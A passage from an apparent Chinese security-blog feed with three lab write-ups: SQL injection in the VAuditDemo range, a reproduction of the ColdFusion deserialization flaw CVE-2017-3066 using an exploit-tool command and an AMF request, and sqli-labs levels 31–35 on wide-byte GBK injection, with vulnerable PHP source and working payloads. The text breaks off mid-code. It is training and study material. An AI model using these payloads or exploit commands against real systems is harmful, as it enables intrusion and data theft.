      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>吃饭先撸了一发代码审计，感觉还行。就是VAuditDemo这个靶场，下午看基友在哪里撸注入，自己也整了个注入。<br><img src="http://5b0988e595225.cdn.sohucs.com/images/20181116/858694dcc64249db8e00da755006a13a.jpeg" alt="858694dcc64249db8e00da755006a13a.jpeg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>我撸的这个是在留言搜索哪里的注入，先看代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'sys/config.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'header.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( !<span class="keyword">empty</span>( $_GET[<span class="string">'search'</span>] ) ) &#123;</span><br><span class="line">$query = <span class="string">"SELECT * FROM comment WHERE comment_text LIKE '%&#123;$_GET['search']&#125;%'"</span>; <span class="comment">/*这里直接带入了参数，并没有过滤所以造成注入*/</span></span><br><span class="line"><span class="keyword">echo</span> $query;</span><br><span class="line">$data = mysql_query($query, $conn);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;div class="bs-example table-responsive"&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">'The result for [ '</span>.$_GET[<span class="string">'search'</span>].<span class="string">' ] is:'</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;table class="table table-striped table-hover "&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;th&gt;<span class="comment">#&lt;/th&gt;</span></span><br><span class="line">&lt;th&gt;Column heading&lt;/th&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">while</span> ( $com = mysql_fetch_array( $data ) ) &#123;</span><br><span class="line"><span class="comment">//净化输出变量</span></span><br><span class="line">$html[<span class="string">'username'</span>] = htmlspecialchars( $com[<span class="string">'user_name'</span>] );</span><br><span class="line">$html[<span class="string">'comment_text'</span>] = htmlspecialchars( $com[<span class="string">'comment_text'</span>] );</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;tr&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;td&gt;'</span>.$html[<span class="string">'username'</span>].<span class="string">'&lt;/td&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;td&gt;&lt;a href="messageDetail.php?id='</span>.$com[<span class="string">'comment_id'</span>].<span class="string">'"&gt;'</span>.$html[<span class="string">'comment_text'</span>].<span class="string">'&lt;/a&gt;&lt;/td&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;/tr&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">isset</span>( $_SESSION[<span class="string">'username'</span>] ) ) &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">"messageSub.php"</span> method=<span class="string">"post"</span> name=<span class="string">"message"</span>&gt;</span><br><span class="line">&lt;div class="col-lg-10"&gt;</span><br><span class="line">        &lt;textarea class="form-control" rows="3" id="textArea" name="message"&gt;&lt;/textarea&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"留言"</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;a href=<span class="string">"user/user.php"</span>&gt;返回&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'footer.php'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>从上面代码可以看到，并没有对搜索处进行过滤就直接带入数据库查询了，我们首先向数据库插入<br>一条留言<br><img src="https://s2.ax1x.com/2019/02/01/k35bwT.png" alt="k35bwT.png"></p><p>然后进行搜索并尝试注入：<br><img src="https://s2.ax1x.com/2019/02/01/k35OkF.png" alt="k35OkF.png"></p><p>根据SQL查询语句注入语句如下：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%90' and 1=1 |'%1 页面返回正常</span><br><span class="line">%90’ and 1=2 |%2 页面返回错误</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/01/k3IpOx.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/02/01/k3ICm6.md.png" alt="k3ICm6.md.png"></p><p>那么接下来盲注即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%90&apos; and(length(database())=4) |&apos;%1 这里我的数据库名叫demo</span><br><span class="line">%90&apos; and(left(database(),4)=&quot;demo&quot;) |&apos;%1 页面返回正常</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/01/k3IiTO.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/02/01/k3oMvR.md.png" alt="k3oMvR.md.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Reproduction of CVE-2017-3066</title>
      <link href="/posts/8129983d.html"/>
      <url>/posts/8129983d.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>继续复现CVE漏洞<br><img src="http://5b0988e595225.cdn.sohucs.com/images/20180510/5c5977424262470b91df6257318adc2e.jpeg" alt="5c5977424262470b91df6257318adc2e.jpeg"></p><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p><p>Adobe ColdFusion中存在java反序列化漏洞。攻击者可利用该漏洞在受影响应用程序的上下文中执行任意代码或造成拒绝服务。以下版本受到影响：Adobe ColdFusion (2016 release) Update 3及之前的版本，ColdFusion 11 Update 11及之前的版本，ColdFusion 10 Update 22及之前的版本。</p><p>参考链接：</p><p><a href="https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html" target="_blank" rel="noopener">https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html</a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>启动漏洞环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure></p><p>等待环境搭建完成后，访问<a href="http://127.0.0.1:8500/CFIDE/administrator/index.cfm，输入密码vulhub，即可成功安装Adobe" target="_blank" rel="noopener">http://127.0.0.1:8500/CFIDE/administrator/index.cfm，输入密码vulhub，即可成功安装Adobe</a> ColdFusion。</p><p><img src="https://s2.ax1x.com/2019/02/01/k3aUIS.md.png" alt="k3aUIS.md.png"></p><p><img src="https://s2.ax1x.com/2019/02/01/k3adPg.png" alt="k3adPg.png"></p><p><img src="https://s2.ax1x.com/2019/02/01/k3a02j.md.png" alt="k3a02j.md.png"></p><p>我们使用参考链接中的<a href="https://github.com/codewhitesec/ColdFusionPwn" target="_blank" rel="noopener">GitHub - codewhitesec/ColdFusionPwn: Exploitation Tool for CVE-2017-3066 targeting Adobe Coldfusion 11/12</a>工具来生成POC：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.6-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 &apos;touch /tmp/success&apos; poc.ser</span><br></pre></td></tr></table></figure></p><p>POC生成于poc.ser文件中，将POC作为数据包body发送给<a href="http://127.0.0.1:8500/flex2gateway/amf，Content-Type为application/x-amf：" target="_blank" rel="noopener">http://127.0.0.1:8500/flex2gateway/amf，Content-Type为application/x-amf：</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /flex2gateway/amf HTTP/1.1</span><br><span class="line">Host: 127.0.0.1.:8500</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-amf</span><br><span class="line">Content-Length: 2853</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/01/k3aWiF.png" alt="k3aWiF.png"></p><p><img src="https://s2.ax1x.com/2019/02/01/k3aIMR.png" alt="k3aIMR.png"></p><p>进入容器中，发现/tmp/success已成功创建：<br><img src="https://s2.ax1x.com/2019/02/01/k3abdK.png" alt="k3abdK.png"><br>改成反弹shell的命令即可获取shell<br>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs Less 31 -&gt; sqli-labse Less 35</title>
      <link href="/posts/a58fa3c8.html"/>
      <url>/posts/a58fa3c8.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今天从sqli-labs Less 31关撸到了35关，感觉很好，这几关是宽字节注入。就是数据库设置编码为GBK，因为gbk编码加上程序本身过滤特殊字符添加反斜杆。会造成一个繁体字：連，导致可以逃逸注入漏洞<br><img src="http://img3.xiazaizhijia.com/walls/20151130/middle_bf818e420c6c9fe.jpg" alt="middle_bf818e420c6c9fe.jpg"></p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><b>第三十一关</b><br>首先看三十一关代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;Less<span class="number">-31</span> FUN with WAF&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:70px;color:#FFF; font-size:40px; text-align:center"</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">"#FF0000"</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])) <span class="comment">/*如果$_GET[id]存在则执行以下*/</span></span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">$qs = $_SERVER[<span class="string">'QUERY_STRING'</span>]; <span class="comment">/*query string（查询字符串），如果有的话，通过它进行页面访问*/</span></span><br><span class="line">$hint=$qs;</span><br><span class="line">$id = <span class="string">'"'</span>.$id.<span class="string">'"'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id= ($id) LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;font size='5' color= '#99FF00'&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">"../images/Less-31.jpg"</span> /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;img src=<span class="string">"../images/Less-31-1.jpg"</span> /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;font size=<span class="string">'4'</span> color= <span class="string">"#33FFFF"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hint: The Query String you input is: "</span>.$hint;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/font&gt; </span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>可以看到在带入数据库查询之前，这个在前后加了个双引号。闭合就是<br>得出的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-31/?id=1&quot;) and 1=2 |(&quot;</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/31/k1yyoq.md.png" alt="k1yyoq.md.png"></p><p><b>第三十二关</b><br>代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;Less<span class="number">-32</span> **Bypass addslashes()**&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:70px;color:#FFF; font-size:23px; text-align:center"</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">"#FF0000"</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">"5"</span> color=<span class="string">"#00FF00"</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string = preg_replace(<span class="string">'/'</span>. preg_quote(<span class="string">'\\'</span>) .<span class="string">'/'</span>, <span class="string">"\\\\\\"</span>, $string);          <span class="comment">//escape any backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\'/i'</span>, <span class="string">'\\\''</span>, $string);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\"/'</span>, <span class="string">"\\\""</span>, $string);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=check_addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line"><span class="comment">//echo "The filtered request is :" .$id . "&lt;br&gt;";</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line">mysql_query(<span class="string">"SET NAMES gbk"</span>); <span class="comment">/*将数据库设置为GBK编码引起的注入*/</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;font color= "#00FF00"&gt;'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">"../images/Less-32.jpg"</span> /&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;font size=<span class="string">'4'</span> color= <span class="string">"#33FFFF"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strToHex</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $hex=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; strlen($string); $i++)</span><br><span class="line">    &#123;</span><br><span class="line">        $hex .= dechex(ord($string[$i]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hint: The Query String you input is escaped as : "</span>.$id .<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"The Query String you input in Hex becomes : "</span>.strToHex($id). <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/font&gt; </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>原本是没有漏洞的，但是由于数据库编码设置为gbk，导致形成了宽字节注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%df’ 由于&apos;的出现会有反斜杆冒出来，但是因为数据库编码为GBK，%df加上反斜杆，导致成为一个</span><br><span class="line">繁体字連，使得&apos;成功逃逸</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/31/k1oX1s.md.png" alt="k1oX1s.md.png"></p><p>最终payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-32/?id=0%df%27%20union%20select%201,user(),3%20%23</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/31/k1Tp7T.md.png" alt="k1Tp7T.md.png"><br>使用URL编码%23来代替#</p><p><b>第三十三关</b><br>三十三关的代码没变化：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span 